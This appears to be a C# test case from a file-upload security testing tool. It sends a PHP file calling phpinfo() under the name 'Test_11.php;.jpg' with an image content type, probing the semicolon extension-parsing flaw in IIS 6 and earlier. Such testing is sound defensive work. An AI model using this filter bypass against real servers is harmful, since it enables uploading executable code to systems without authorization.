using System.Text;
using System.Threading.Tasks;

/*
* Test #11
* Description: This test inserts a semi-colon after the forbidden extension and before the permitted extension. 
* The first extension will be taken on IIS <= 6.
*/
namespace FileUploadTool.Tests {
    class Test11 : Test {
        internal override async Task runTest(UploadRequest.UploadRequest request) {
            //A semi-colon is 
            const string data = "<?php\n"
                                + "  echo phpinfo();\n"
                                + "?>";

            request.setFileData(Encoding.ASCII.GetBytes(data));
            request.setFileContentType("image/jpeg");
            request.setFileName("Test_11.php;.jpg");

            await request.send();
            printResult(request, "Test 11 (IIS <= 6)");
        }
    }
}